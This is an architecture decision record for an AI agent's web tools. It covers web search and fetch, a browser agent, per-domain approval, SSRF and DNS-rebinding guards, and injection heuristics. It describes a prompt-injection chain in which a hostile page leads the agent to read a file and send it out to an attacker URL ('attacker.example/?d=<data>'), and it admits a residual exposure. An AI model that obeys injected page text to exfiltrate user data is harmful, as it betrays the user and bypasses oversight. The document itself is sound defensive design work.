# ADR 0012 — Web access: search + fetch, and a browser agent with per-domain approval

Status: accepted (phase G). Replaces the quarantine model and `browse_url`; supersedes the "web search is a connector/browser tool" remark in [0008](0008-unified-provider-catalog.md) and the "taint-based approval" item left open in [0011](0011-hardening.md).

## Context

Web access had grown three overlapping mechanisms: `browse_url` (fetch a URL and let a small *quarantine* LLM extract an answer), observation summaries by the same model, and the browser agent (`browser_open/observe/act/close`). Problems:

- A second model between the page and the agent does not remove prompt injection — it reads the same hostile text and can pass it on as readily as the first one. It also added a service to run and a place where content is silently rewritten.
- `browse_url` was auto-approved, so the chain *injected page → read a file → GET to the attacker's URL with the data in the query* needed no human at all. The audit (F-05) proposed taint tracking; that is heavy and still heuristic.
- Searching the web and driving a browser are different jobs and were presented as one.

## Decision

Two tools, each the standard shape users know from Claude, Gemini and Antigravity. No model sits between a page and the agent.

**1. `web_search` + `web_fetch`** (chat functions, run by the orchestrator, `cli/src/web/`):

- `web_search(query, count, recency)` → titles, URLs, snippets. Backends are pluggable in *Settings → Web*: SearXNG (self-hosted, JSON format enabled) or the Brave Search API (key in the key vault). Switched off until configured; then the tool is simply not offered. No approval: a query reveals only the query.
- `web_fetch(url, offset, max_chars)` → the page as markdown (linkedom + Readability + Turndown, deterministic), read in parts, kept 5 minutes in a small cache so paging does not re-download. HTML, JSON and plain text only; no JavaScript is run, nothing is clicked, images become `[image: alt]`.
- Safety of the fetcher itself (`web/http.ts`): only http(s), no credentials in URLs, the resolved address is checked **at connection time** (any private record refuses the host — DNS rebinding cannot win), a fresh connection per request, redirects followed only inside the same host (a redirect to another host is handed back to the model as a new URL, which is a new domain to approve), a hard byte cap applied after decompression (gzip bombs stop at the cap) and a 20 s deadline.
- Everything that comes back is sanitised (invisible Unicode stripped), wrapped as nonce-tagged untrusted content, and scored by the deterministic injection heuristic; the first line is a `[browser-meta]` JSON like browser observations carry.

**2. Browser agent** (existing `browser_*` tools): unchanged in what it does, changed in who may go where.

**3. Approval per domain, with the same exemption Claude and Gemini rely on.**

- `web_fetch` opens **without asking** every address that is already in the conversation (`web/provenance.ts`): a URL or bare domain the user typed (the whole host), or a URL returned by `web_search` / an earlier `web_fetch` (exactly that URL — appending a query string makes it a different address). Text the model wrote itself, and URLs from other tools' results (e.g. a file), never count. Subagents do not trust URLs in their goal (a model wrote it). After a page looked like a prompt injection even known addresses ask. This is what closes the exfiltration channel: the model cannot open `https://attacker.example/?d=<data>` on its own.
- Any other `web_fetch` address, and every `browser_open`, asks before touching a host that is not yet allowed. The card says *Allow web access to \<host\>?* with **Allow once / For this chat / Always**. The decision is an ordinary grant with the label `web:<host>` in `approval_grants`, so scopes, revocation (Settings → Web lists them), audit and the "no grants after a suspected injection" rule all come for free.

- Hosts are exact (`docs.example.com` ≠ `example.com`); the user sees what they allow.
- For the browser the orchestrator sends the currently granted hosts as `_policy.domainGrant` on **every** call, so revoking a grant stops the next click. "Allow once" is passed as `_approved_host` on that `browser_open` and lives in the browser session only. Both hidden arguments are stripped from model input. Top-level navigation to a host that is neither granted nor approved is refused with a message telling the model to call `browser_open` for it (which asks). Sub-resources (images, scripts, XHR) are not gated — only the operator's deny list and the SSRF guard apply, as in every browser.
- `browser_open`, `browser_act` and `browser_close` are in the default auto-approve list, because the domain is the approval. `browser_act` still asks when its label looks irreversible (payment, deletion, subscription…) and, like every effectful tool, after a page looked like a prompt injection. Plan mode refuses `browser_act` but allows reading.
- The operator layers stay above the user: `BROWSER_DOMAIN_DENY` always wins, `BROWSER_DOMAIN_ALLOW` restricts everything to its list, the SSRF guard (browser) and the connect-time address check (`web_fetch`) cannot be approved away.

## Consequences

- The F-05 chain is closed without taint tracking: reading a file and then sending it to an address the model composed needs a click on that domain, and after a flagged page every effectful call asks again.
- **Residual risk, stated plainly:** once a user allows a domain, a hostile page *on that domain* can still make the agent send data to it (URL query, form). That is the same exposure as in Antigravity's browser agent. A link inside a search result or fetched page can itself be hostile and may carry data in its own (exact) URL — the same residual exposure as in Claude.
- Removed: `browse_url`, the quarantine model, observation summaries and their environment variables (`QUARANTINE_*`, `OBSERVATION_QUARANTINE_ENABLED`, `OBSERVATION_MAX_INPUT_CHARS`). Existing `AUTO_APPROVE_TOOLS` overrides that still name `browse_url` are harmless; one that omits the browser tools makes them ask in addition to the domain card.
- New settings: *Settings → Web* (engine, SearXNG URL, Brave key); optional `SEARXNG_URL` / `BRAVE_API_KEY` defaults for a fresh install.
- Not done on purpose: reading PDFs and other binary formats in `web_fetch`, per-path rules, wildcard domains in grants, pre-approved domain lists in the UI. `policy.json` remains the place for operator-level browser rules.
